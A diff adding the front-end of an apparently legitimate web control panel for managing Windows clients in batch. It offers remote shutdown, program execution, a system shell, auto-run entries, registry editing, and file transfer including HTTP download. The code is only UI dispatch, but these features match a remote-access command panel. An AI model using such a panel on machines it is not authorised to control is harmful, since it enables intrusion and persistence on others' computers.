+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	//document.frmFunction.txtP1.placeholder = document.frmFunction.txtP1.title;
+	//document.frmFunction.txtP2.placeholder = document.frmFunction.txtP2.title;
+	//document.frmFunction.txtP3.placeholder = document.frmFunction.txtP3.title;
+	//document.frmFunction.txtP4.placeholder = document.frmFunction.txtP4.title;
+	if(document.frmFunction.txtP1.title=="")
+	{
+		document.getElementById("p1l").innerHTML = "<h3>(unused)</h3>";
+	}
+	else
+	{
+		document.getElementById("p1l").innerHTML = "<h3>" + document.frmFunction.txtP1.title + ":</h3>";
+	}
+	if(document.frmFunction.txtP2.title=="")
+	{
+		document.getElementById("p2l").innerHTML = "<h3>(unused)</h3>";
+	}
+	else
+	{
+		document.getElementById("p2l").innerHTML = "<h3>" + document.frmFunction.txtP2.title + ":</h3>";
+	}
+	if(document.frmFunction.txtP3.title=="")
+	{
+		document.getElementById("p3l").innerHTML = "<h3>(unused)</h3>";
+	}
+	else
+	{
+		document.getElementById("p3l").innerHTML = "<h3>" + document.frmFunction.txtP3.title + ":</h3>";
+	}
+	if(document.frmFunction.txtP4.title=="")
+	{
+		document.getElementById("p4l").innerHTML = "<h3>(unused)</h3>";
+	}
+	else
+	{
+		document.getElementById("p4l").innerHTML = "<h3>" + document.frmFunction.txtP4.title + ":</h3>";
+	}
+	if(document.frmFunction.optTips1.checked==true)
+	{
+		document.frmFunction.txtP1.value = "";
+		document.frmFunction.txtP2.value = "";
+		document.frmFunction.txtP3.value = "";
+		document.frmFunction.txtP4.value = "";
+	}
+}
+function btnPerform_click()
+{
+	var index = document.frmFunction.cmbFunction.selectedIndex;
+	var val = document.frmFunction.cmbFunction.options[index].value;
+	if(val=="CLIENT_NULL")
+	{
+		alert("You must choose a meaningful option.");
+	}
+	else if(val=="CLIENT_SC")
+	{
+		handle_client_request(2);
+	}
+	else if(val=="CLIENT_RC")
+	{
+		handle_client_request(3);
+	}
+	else if(val=="CLIENT_CONFIG")
+	{
+		handle_client_request(10);
+	}
+	else if(val=="CLIENT_UC1")
+	{
+		handle_client_request(11);
+	}
+	else if(val=="CLIENT_UC2")
+	{
+		handle_client_request(12);
+	}
+	else if(val=="CLIENT_TC")
+	{
+		handle_client_request(33);
+	}
+	else if(val=="CLIENT_DIR")
+	{
+		handle_client_request(4);
+	}
+	else if(val=="CLIENT_DLF")
+	{
+		handle_client_request(5);
+	}
+	else if(val=="CLIENT_UPF")
+	{
+		handle_client_request(6);
+	}
+	else if(val=="CLIENT_REG")
+	{
+		handle_client_request(7);
+	}
+	else if(val=="CLIENT_EXE")
+	{
+		handle_client_request(8);
+	}
+	else if(val=="CLIENT_CMD")
+	{
+		handle_client_request(9);
+	}
+	else if(val=="CLIENT_ATR_ADD")
+	{
+		handle_client_request(13);
+	}
+	else if(val=="CLIENT_ATR_DEL")
+	{
+		handle_client_request(14);
+	}
+	else if(val=="CLIENT_ATR_CLEAR")
+	{
+		handle_client_request(15);
+	}
+	else if(val=="CLIENT_ATR_QUERY")
+	{
+		handle_client_request(16);
+	}
+	else if(val=="CLIENT_REG_CREATE_KEY")
+	{
+		handle_client_request(17);
+	}
+	else if(val=="CLIENT_REG_DELETE_KEY")
+	{
+		handle_client_request(18);
+	}
+	else if(val=="CLIENT_REG_RENAME_KEY")
+	{
+		handle_client_request(19);
+	}
+	else if(val=="CLIENT_REG_DELETE_VALUE")
+	{
+		handle_client_request(20);
+	}
+	else if(val=="CLIENT_REG_QUERY_VALUE")
+	{
+		handle_client_request(21);
+	}
+	else if(val=="CLIENT_REG_SET_VALUE")
+	{
+		handle_client_request(22);
+	}
+	else if(val=="CLIENT_FSO_CREATE_FILE")
+	{
+		handle_client_request(23);
+	}
+	else if(val=="CLIENT_FSO_CREATE_DIRECTORY")
+	{
+		handle_client_request(24);
+	}
+	else if(val=="CLIENT_FSO_COPY")
+	{
+		handle_client_request(25);
+	}
+	else if(val=="CLIENT_FSO_DELETE")
+	{
+		handle_client_request(26);
+	}
+	else if(val=="CLIENT_FSO_RENAME")
+	{
+		handle_client_request(27);
+	}
+	else if(val=="CLIENT_FSO_SET_ATTRIB")
+	{
+		handle_client_request(28);
+	}
+	else if(val=="CLIENT_FSO_GET_ATTRIB")
+	{
+		handle_client_request(29);
+	}
+	else if(val=="CLIENT_FSO_HTTP_DOWNLOAD")
+	{
+		handle_client_request(30);
+	}
+	else if(val=="CLIENT_FSO_GET_CRC32")
+	{
+		handle_client_request(31);
+	}
+	else if(val=="CLIENT_FSO_DELAY_MOV_DEL")
+	{
+		handle_client_request(32);
+	}
+}
+</script>
+<html>
+<head>
+<title>Windows Batch Deployment Web Control Panel - Client Management</title>
+</head>
+<body>
+<form method="post" action="main.php" name="frmFunction">
+<fieldset>
+<legend><h2>Client</h2></legend>
+<input type="submit" style="width:100%;height:100px;font-size:50px" name="btnListClients" value="List Clients" id="btnListClients"></input>
+<button type="button" style="width:50%;height:100px;font-size:40px" name="btnSelAll" onclick="select_all_clients(true)">Select All</button><button type="button" style="width:50%;height:100px;font-size:40px" name="btnDeselAll" onclick="select_all_clients(false)">Deselect All</button>
+<button type="button" style="width:50%;height:100px;font-size:40px" name="btnConnect" onclick="handle_client_request(1)">Connect</button><button type="button" style="width:50%;height:100px;font-size:40px" name="btnDisconnect" onclick="handle_client_request(0)">Disconnect</button>
+</fieldset>
+<fieldset>
+<legend><h2>Operation</h2></legend>
+<select style="width:100%;font-size:25px" name="cmbFunction" id="cmbFunction" onchange="cmbFunction_change(this)">
+<option value="CLIENT_NULL">Please choose an operation...</option>
+<optgroup label="Client">
+<option value="CLIENT_SC">Shutdown</option>
+<option value="CLIENT_RC">Reboot</option>
+<option value="CLIENT_TC">Test</option>
+<option value="CLIENT_UC1">Update</option>
+<option value="CLIENT_UC2">Uninstall</option>
+<option value="CLIENT_CONFIG">Configure</option>
+</optgroup>
+<optgroup label="Program & Auto-Run">
+<option value="CLIENT_EXE">Execute Program</option>
+<option value="CLIENT_CMD">System Shell</option>
+<option value="CLIENT_ATR_ADD">Add Auto-Run Item</option>
+<option value="CLIENT_ATR_DEL">Delete Auto-Run Item</option>
+<option value="CLIENT_ATR_CLEAR">Delete All Auto-Run Items</option>
+<option value="CLIENT_ATR_QUERY">Query Existing Auto-Run Items</option>
+</optgroup>
+<optgroup label="File & Directory">
+<option value="CLIENT_DIR">Enumerate Directory</option>
+<option value="CLIENT_DLF">Download File</option>
+<option value="CLIENT_UPF">Upload File</option>
+<option value="CLIENT_FSO_CREATE_FILE">Create File</option>
+<option value="CLIENT_FSO_CREATE_DIRECTORY">Create Directory</option>
+<option value="CLIENT_FSO_COPY">Copy File / Directory</option>
+<option value="CLIENT_FSO_DELETE">Delete File / Directory</option>
+<option value="CLIENT_FSO_RENAME">Rename File / Directory</option>
+<option value="CLIENT_FSO_SET_ATTRIB">Set Attribute of File / Directory</option>
+<option value="CLIENT_FSO_GET_ATTRIB">Get Attribute of File / Directory</option>
+<option value="CLIENT_FSO_HTTP_DOWNLOAD">Download File via HTTP Link</option>
+<option value="CLIENT_FSO_GET_CRC32">Get File CRC32</option>
+<option value="CLIENT_FSO_DELAY_MOV_DEL">Delay to (Re)Move File / Directory</option>
+</optgroup>
+<optgroup label="Registry">
+<option value="CLIENT_REG">Enumerate Key</option>
+<option value="CLIENT_REG_CREATE_KEY">Create Key</option>
+<option value="CLIENT_REG_DELETE_KEY">Delete Key</option>
+<option value="CLIENT_REG_RENAME_KEY">Rename Key</option>
+<option value="CLIENT_REG_DELETE_VALUE">Delete Value</option>
+<option value="CLIENT_REG_QUERY_VALUE">Query Value</option>
+<option value="CLIENT_REG_SET_VALUE">Set Value</option>
+</optgroup>
+</select>
+<p><input type="radio" name="optTips[]" id="optTips0" onclick="Radio_click(this)" checked></input><label for="optTips0" style="width:100%;height:50px;font-size:25px">Keep the text in parameter text-boxes after selecting a new operation.</label><br></p>
+<p><input type="radio" name="optTips[]" id="optTips1" onclick="Radio_click(this)"></input><label for="optTips1" style="width:100%;height:50px;font-size:25px">Clear the text in parameter text-boxes after selecting a new operation.</label><br></p>
+<hr></hr>
+<label id="p1l"><h3>Parameter 1:</h3></label><p id="p1t"><input type="text" style="width:100%;height:50px;font-size:25px" name="txtP1" value="" disabled onfocus="TextBox_getfocus(this)"></input></p>
+<label id="p2l"><h3>Parameter 2:</h3></label><p id="p2t"><input type="text" style="width:100%;height:50px;font-size:25px" name="txtP2" value="" disabled onfocus="TextBox_getfocus(this)"></input></p>
+<label id="p3l"><h3>Parameter 3:</h3></label><p id="p3t"><input type="text" style="width:100%;height:50px;font-size:25px" name="txtP3" value="" disabled onfocus="TextBox_getfocus(this)"></input></p>
+<label id="p4l"><h3>Parameter 4:</h3></label><p id="p4t"><input type="text" style="width:100%;height:50px;font-size:25px" name="txtP4" value="" disabled onfocus="TextBox_getfocus(this)"></input></p>
+<p><hr></hr></p>
+<button type="button" style="width:100%;height:100px;font-size:50px" name="btnPerform" onclick="btnPerform_click()">Perform</button>
+<p><hr></hr></p>
+<p>
+<h3>Output:</h3>
+<textarea readonly style="width:100%;height:500px;font-size:18px;font-family:Consolas,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace" name="txtOUT"></textarea><br>
+</p>
+</fieldset>
+</form>
+<button type="button" style="width:100%;height:100px;font-size:50px" name="btnOpenSrvMgr" onclick="window.open('srvmgr.php','_blank')">Server File Management</button>
+</body>
+</html>
